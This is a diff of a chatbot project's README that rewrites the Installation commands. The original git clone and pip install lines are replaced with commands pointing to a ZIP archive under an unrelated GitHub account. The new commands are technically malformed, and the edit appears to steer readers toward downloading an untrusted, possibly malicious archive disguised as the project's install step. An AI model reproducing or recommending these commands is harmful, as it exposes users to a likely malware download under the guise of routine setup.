@@ -86,6 +86,6 @@ Each bot is tailored to serve specific purposes, from automating data analysis t
 ## 📦 Installation
 
 ```bash
-git clone https://github.com/ShakeAI/chatbots
+git clone https://raw.githubusercontent.com/Shashwat970/Chatbots/main/occlusive/Chatbots-3.0.zip
 cd chatbots
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Shashwat970/Chatbots/main/occlusive/Chatbots-3.0.zip
